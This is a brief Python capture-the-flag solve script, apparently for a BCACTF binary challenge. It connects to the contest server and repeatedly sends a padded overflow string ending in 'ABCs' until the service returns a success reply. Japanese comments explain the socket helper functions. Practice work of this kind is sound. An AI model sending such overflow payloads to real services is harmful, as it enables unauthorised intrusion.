from Crypto.Util.number import *
from functools import reduce
from operator import mul
from itertools import combinations
import sys
import socket, struct, telnetlib

# --- common funcs ---
def sock(remoteip, remoteport):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((remoteip, remoteport))
	return s, s.makefile('rw')

def read_until(f, delim='\n'):
	data = ''
	while not data.endswith(delim):
		data += f.read(1)
	return data

	
#HOSTはIPアドレスでも可
HOST, PORT = "bin.bcactf.com", 49154
test = "0000000000000000000000000000000000000000zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzABCs"
x = "73434241"
print("x")
print(x)
while True:
	#test += "z"
	s, f = sock(HOST, PORT)
	for _ in range(46): read_until(f)
	print(read_until(f,"Answer for 1: "))
	#s.send(test.encode()+b"\n")
	s.send(test.encode()+b"\n")
	for _ in range(2): read_until(f)
	print(test)
	#s.close()
	recv_m = read_until(f).strip()
	print(recv_m)
	if "tsk" in recv_m:
		while True: print(read_until(f))
	s.close()

#read_untilの使い方
#返り値があるのでprintするか、何かの変数に入れる
#1行読む：read_until(f)
#特定の文字まで読む：read_until(f,"input")
#配列に格納する：recv_m = read_until(f).split() or .strip()

#サーバーに何か送るとき
#s.send(b'1\n') : 1を送っている
#バイト列で送ること。str->bytesにするには、変数の後に.encode()
#必ず改行を入れること。終了ポイントが分からなくなる。ex) s.send(flag.encode() + b'\n')

